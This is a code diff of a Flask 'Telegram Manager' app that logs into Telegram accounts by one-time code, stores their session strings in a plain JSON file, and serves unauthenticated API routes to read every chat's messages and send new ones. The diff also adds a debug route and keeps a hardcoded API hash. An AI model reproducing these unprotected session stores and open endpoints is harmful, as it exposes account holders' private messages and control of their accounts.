@@ -2,10 +2,6 @@ from flask import Flask, send_file, jsonify, request
 from flask_cors import CORS
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
-from telethon.tl.types import (
-    MessageMediaPhoto, MessageMediaDocument, 
-    DocumentAttributeAudio, DocumentAttributeVideo
-)
 import json
 import os
 import asyncio
@@ -25,8 +21,8 @@ API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
 
 # Storage
 ACCOUNTS_FILE = 'accounts.json'
-accounts = []  # All accounts
-temp_sessions = {}  # Temporary OTP sessions
+accounts = []
+temp_sessions = {}
 
 # Helper to run async functions
 def run_async(coro):
@@ -73,25 +69,15 @@ load_accounts()
 # -------------------- PAGE ROUTES --------------------
 @app.route('/')
 def home():
-    try:
-        return send_file('login.html')
-    except Exception as e:
-        logger.error(f"Error serving login.html: {e}")
-        return "login.html not found", 404
+    return send_file('login.html')
 
 @app.route('/login')
 def login():
-    try:
-        return send_file('login.html')
-    except:
-        return "login.html not found", 404
+    return send_file('login.html')
 
 @app.route('/dashboard')
 def dashboard():
-    try:
-        return send_file('dashboard.html')
-    except:
-        return "dashboard.html not found", 404
+    return send_file('dashboard.html')
 
 # -------------------- API ROUTES --------------------
 
@@ -142,7 +128,6 @@ def add_account():
         result = run_async(send_code())
         return jsonify(result)
     except Exception as e:
-        logger.error(f"Error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 # Verify code
@@ -179,7 +164,6 @@ def verify_code():
             
             me = await client.get_me()
             
-            # Create new account
             new_id = 1
             if accounts:
                 new_id = max([a['id'] for a in accounts]) + 1
@@ -188,7 +172,6 @@ def verify_code():
                 'id': new_id,
                 'phone': me.phone or session_data['phone'],
                 'name': me.first_name or 'User',
-                'username': me.username or '',
                 'session': client.session.save()
             }
             
@@ -209,16 +192,14 @@ def verify_code():
     try:
         result = run_async(verify())
         
-        # Clean up temp session
         if session_id in temp_sessions:
             del temp_sessions[session_id]
         
         return jsonify(result)
     except Exception as e:
-        logger.error(f"Error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
-# Get chats and messages - FIXED VERSION
+# Get chats and messages - FIXED WITH MESSAGES
 @app.route('/api/get-messages', methods=['POST'])
 def get_messages():
     data = request.json
@@ -237,18 +218,12 @@ def get_messages():
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
     
-    logger.info(f"Fetching chats for account {account_id}")
-    
     async def fetch():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
         
         try:
-            # Check if authorized
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'Not authorized'}
-            
-            # Get all dialogs (chats)
+            # Get all dialogs
             dialogs = await client.get_dialogs()
             logger.info(f"Found {len(dialogs)} dialogs")
             
@@ -256,89 +231,41 @@ def get_messages():
             all_messages = []
             
             for dialog in dialogs:
-                if not dialog or not dialog.entity:
+                if not dialog:
                     continue
                 
-                # Get chat ID properly
-                chat_id = str(dialog.id)
-                if dialog.is_user and hasattr(dialog.entity, 'username') and dialog.entity.username:
-                    chat_id = f"@{dialog.entity.username}"
-                
-                # Determine chat type
+                # Chat info
                 chat_type = 'user'
                 if dialog.is_group:
                     chat_type = 'group'
                 elif dialog.is_channel:
                     chat_type = 'channel'
-                elif dialog.is_user and hasattr(dialog.entity, 'bot') and dialog.entity.bot:
-                    chat_type = 'bot'
                 
-                # Get chat name
-                if dialog.is_user:
-                    if hasattr(dialog.entity, 'first_name'):
-                        name = f"{dialog.entity.first_name or ''}"
-                        if hasattr(dialog.entity, 'last_name') and dialog.entity.last_name:
-                            name += f" {dialog.entity.last_name}"
-                    else:
-                        name = dialog.name or 'User'
-                else:
-                    name = dialog.name or 'Unknown'
+                chat_id = str(dialog.id)
                 
-                # Get last message
-                last_msg = ''
-                last_date = 0
-                last_msg_media = None
-                
-                if dialog.message:
-                    if dialog.message.text:
-                        last_msg = dialog.message.text[:100]
-                        if len(dialog.message.text) > 100:
-                            last_msg += '...'
-                    elif dialog.message.media:
-                        if isinstance(dialog.message.media, MessageMediaPhoto):
-                            last_msg = '📷 Photo'
-                            last_msg_media = 'photo'
-                        elif isinstance(dialog.message.media, MessageMediaDocument):
-                            # Check if it's a video or document
-                            attrs = dialog.message.media.document.attributes
-                            is_video = any(isinstance(attr, DocumentAttributeVideo) for attr in attrs)
-                            is_audio = any(isinstance(attr, DocumentAttributeAudio) for attr in attrs)
-                            
-                            if is_video:
-                                last_msg = '🎥 Video'
-                                last_msg_media = 'video'
-                            elif is_audio:
-                                for attr in attrs:
-                                    if isinstance(attr, DocumentAttributeAudio):
-                                        if attr.voice:
-                                            last_msg = '🎤 Voice'
-                                            last_msg_media = 'voice'
-                                        else:
-                                            last_msg = '🎵 Audio'
-                                            last_msg_media = 'audio'
-                                        break
-                            else:
-                                last_msg = '📎 Document'
-                                last_msg_media = 'document'
-                        else:
-                            last_msg = '📎 Media'
-                            last_msg_media = 'media'
-                    
-                    if dialog.message.date:
-                        last_date = int(dialog.message.date.timestamp())
-                
-                # Add to chats list
-                chats.append({
+                # Create chat object
+                chat = {
                     'id': chat_id,
-                    'title': name,
+                    'title': dialog.name or 'Unknown',
                     'type': chat_type,
                     'unread': dialog.unread_count or 0,
-                    'lastMessage': last_msg,
-                    'lastMessageMedia': last_msg_media,
-                    'lastMessageDate': last_date
-                })
+                    'lastMessage': '',
+                    'lastMessageDate': 0
+                }
                 
-                # Get recent messages (limit 15)
+                # Add last message if exists
+                if dialog.message:
+                    if dialog.message.text:
+                        chat['lastMessage'] = dialog.message.text[:50]
+                    elif dialog.message.media:
+                        chat['lastMessage'] = '📎 Media'
+                    
+                    if dialog.message.date:
+                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
+                
+                chats.append(chat)
+                
+                # Get last 15 messages for this chat
                 try:
                     messages = await client.get_messages(dialog.entity, limit=15)
                     
@@ -346,67 +273,29 @@ def get_messages():
                         if not msg:
                             continue
                         
-                        # Message text
+                        # Get message text
                         msg_text = msg.text or ''
-                        media_type = None
-                        
-                        # Check for media
                         if msg.media:
-                            if isinstance(msg.media, MessageMediaPhoto):
-                                media_type = 'photo'
-                                if not msg_text:
-                                    msg_text = '📷 Photo'
-                            elif isinstance(msg.media, MessageMediaDocument):
-                                # Check document type
-                                attrs = msg.media.document.attributes
-                                is_video = any(isinstance(attr, DocumentAttributeVideo) for attr in attrs)
-                                is_audio = any(isinstance(attr, DocumentAttributeAudio) for attr in attrs)
-                                
-                                if is_video:
-                                    media_type = 'video'
-                                    if not msg_text:
-                                        msg_text = '🎥 Video'
-                                elif is_audio:
-                                    for attr in attrs:
-                                        if isinstance(attr, DocumentAttributeAudio):
-                                            if attr.voice:
-                                                media_type = 'voice'
-                                                if not msg_text:
-                                                    msg_text = '🎤 Voice'
-                                            else:
-                                                media_type = 'audio'
-                                                if not msg_text:
-                                                    msg_text = '🎵 Audio'
-                                            break
-                                else:
-                                    media_type = 'document'
-                                    if not msg_text:
-                                        msg_text = '📎 Document'
-                            else:
-                                media_type = 'media'
-                                if not msg_text:
-                                    msg_text = '📎 Media'
+                            msg_text = '📎 Media'
                         
-                        # Message date
+                        # Get message date
                         msg_date = 0
                         if msg.date:
                             msg_date = int(msg.date.timestamp())
                         
+                        # Add to messages list
                         all_messages.append({
                             'chatId': chat_id,
                             'text': msg_text,
                             'date': msg_date,
                             'out': msg.out or False,
                             'id': msg.id,
-                            'hasMedia': msg.media is not None,
-                            'mediaType': media_type
+                            'hasMedia': msg.media is not None
                         })
                         
                 except Exception as e:
                     logger.error(f"Error getting messages for {chat_id}: {e}")
                     continue
-            
-            logger.info(f"Returning {len(chats)} chats and {len(all_messages)} messages")
             
             return {
                 'success': True,
@@ -415,7 +304,7 @@ def get_messages():
             }
             
         except Exception as e:
-            logger.error(f"Error in fetch: {e}")
+            logger.error(f"Error: {e}")
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
@@ -455,24 +344,17 @@ def send_message():
         try:
             # Get entity
             try:
-                if chat_id.startswith('-100'):
-                    entity = await client.get_entity(int(chat_id))
-                elif chat_id.startswith('@'):
+                entity = await client.get_entity(int(chat_id))
+            except:
+                try:
                     entity = await client.get_entity(chat_id)
-                else:
-                    try:
-                        entity = await client.get_entity(int(chat_id))
-                    except ValueError:
-                        entity = await client.get_entity(chat_id)
-            except Exception as e:
-                logger.error(f"Error getting entity: {e}")
-                return {'success': False, 'error': 'Chat not found'}
+                except:
+                    return {'success': False, 'error': 'Chat not found'}
             
             await client.send_message(entity, message)
             return {'success': True}
             
         except Exception as e:
-            logger.error(f"Send error: {e}")
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
@@ -481,7 +363,6 @@ def send_message():
         result = run_async(send())
         return jsonify(result)
     except Exception as e:
-        logger.error(f"Error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 # Remove account
@@ -503,29 +384,58 @@ def remove_account():
     
     return jsonify({'success': False, 'error': 'Account not found'})
 
+# Debug endpoint
+@app.route('/api/debug/chats/<int:account_id>', methods=['GET'])
+def debug_chats(account_id):
+    """Debug endpoint to test chat loading"""
+    try:
+        # Find account
+        account = None
+        for acc in accounts:
+            if acc['id'] == account_id:
+                account = acc
+                break
+        
+        if not account:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def test():
+            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            await client.connect()
+            
+            try:
+                dialogs = await client.get_dialogs()
+                return {
+                    'success': True,
+                    'count': len(dialogs),
+                    'names': [d.name for d in dialogs[:10] if d.name]
+                }
+            except Exception as e:
+                return {'success': False, 'error': str(e)}
+            finally:
+                await client.disconnect()
+        
+        result = run_async(test())
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
 # Health check
 @app.route('/api/health', methods=['GET'])
 def health_check():
     return jsonify({
         'status': 'healthy',
         'accounts': len(accounts),
-        'temp_sessions': len(temp_sessions),
-        'files': {
-            'login.html': os.path.exists('login.html'),
-            'dashboard.html': os.path.exists('dashboard.html'),
-            'accounts.json': os.path.exists(ACCOUNTS_FILE)
-        }
+        'temp_sessions': len(temp_sessions)
     })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     print('\n' + '='*50)
-    print('TELEGRAM MANAGER - FIXED CHAT LOADING')
+    print('TELEGRAM MANAGER - WITH MESSAGES')
     print('='*50)
     print(f'Port: {port}')
     print(f'Accounts loaded: {len(accounts)}')
-    print(f'login.html exists: {os.path.exists("login.html")}')
-    print(f'dashboard.html exists: {os.path.exists("dashboard.html")}')
     print('='*50 + '\n')
     
     app.run(host='0.0.0.0', port=port, debug=False)
